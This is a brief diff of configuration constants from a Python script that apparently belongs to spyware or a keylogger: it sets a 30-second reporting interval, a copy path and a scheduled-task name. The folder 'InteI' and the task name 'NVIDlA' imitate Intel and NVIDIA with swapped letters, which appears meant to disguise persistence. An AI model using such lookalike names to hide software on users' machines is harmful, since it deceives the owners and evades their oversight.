@@ -17,7 +17,7 @@ SEND_REPORT_EVERY = 30  # seconds
 MAGIC_WORD = "stop"
 
 SRC_FILE = "D:\main.exe"
-DEST_FOLDER = "C:\ProgramData\InteI"
+DEST_FOLDER = os.path.join(os.getenv('USERPROFILE'), 'InteI')
 TASK_NAME = "NVIDlA"
 
 
